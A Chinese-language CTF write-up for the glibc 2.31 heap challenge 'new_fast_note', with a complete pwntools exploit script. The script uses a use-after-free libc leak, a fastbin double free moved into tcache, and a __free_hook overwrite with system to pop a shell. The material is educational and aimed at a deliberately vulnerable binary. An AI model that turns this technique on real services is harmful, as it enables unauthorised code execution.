# new_fast_note

## 题目简述

这是 `fast_note` 在 glibc 2.31 下的变体。该版本增加了 tcache：同尺寸 chunk 释放时先进入容量为 7 的 tcache，装满后才进入 fastbin；tcache 自身会检查 double free，但 fastbin 路径仍可构造重复释放。题目同样保留释放后指针，可先泄露 libc，再把 fastbin 链转入 tcache 并攻击 `__free_hook`。

## 解题过程

libc 泄露与 `editable_note` 相同：释放 8 个请求大小为 `0x90` 的 chunk，使第 8 个进入 unsorted bin，通过 UAF 读取 `main_arena` 指针。

随后对请求大小 `0x10` 的 chunk 操作：

1. 先释放足够多的 chunk 填满 7 项 tcache；
2. 后续 chunk 进入 fastbin，在 fastbin 中构造 `A -> B -> A`；
3. 重新申请并排空 tcache时，glibc 会把 fastbin 节点转移到 tcache；
4. 利用重复节点让一次分配内容成为后续 tcache `fd`，把链表指向 `__free_hook`；
5. 在 hook 写入 `system`，释放 `/bin/sh` chunk。

官方脚本的完整分配顺序如下：

```python
from pwn import *

context.arch = "amd64"

elf = ELF("./vuln", checksec=False)
libc = ELF("./libc-2.31.so", checksec=False)

if args.REMOTE:
    host = args.HOST or "challenge.example"
    port = int(args.PORT or 31337)
    io = remote(host, port)
else:
    io = process(elf.path)


def add(index: int, size: int, content: bytes) -> None:
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendafter(b"Content: ", content)


def delete(index: int) -> None:
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b"Index: ", str(index).encode())


def show(index: int) -> None:
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b"Index: ", str(index).encode())


# unsorted bin 泄露。
for index in range(8):
    add(index, 0x90, b"aaaa")
add(8, 0x10, b"gap")

for index in range(8):
    delete(index)

show(7)
main_arena_pointer = u64(io.recv(6).ljust(8, b"\x00"))
libc.address = main_arena_pointer - 0x1ECBE0
free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]

# 前 7 个释放进入 tcache，后续进入 fastbin。
for index in range(10):
    add(index, 0x10, b"aaaa")
add(10, 0x10, b"gap")

for index in range(10):
    delete(index)

# 此时 fastbin 链首不是 index 8，因此再次释放 8 可形成重复节点。
delete(8)

# 排空 tcache，并让 fastbin 节点被转移进 tcache。
for index in range(7):
    add(index, 0x10, b"/bin/sh\x00")

add(7, 0x10, p64(free_hook))
add(8, 0x10, p64(0))
add(9, 0x10, p64(0))
add(10, 0x10, p64(system))

delete(0)
io.interactive()
```

glibc 2.31 尚未采用 2.32 引入的 safe-linking，因此脚本直接写裸 `fd` 指针。偏移与 hook 均依赖题目 libc；原 PDF 没有给出最终 flag 文本，但利用流程完整。

## 方法总结

本题不能把 glibc 2.23 的 fastbin 模板原样搬过来。加入 tcache 后，释放和分配的优先级、容量以及 fastbin-to-tcache 转移共同决定链表状态。稳定利用前应逐步记录每个 chunk 当前位于 tcache、fastbin、unsorted bin 还是已分配状态，并确认目标版本是否启用 safe-linking。
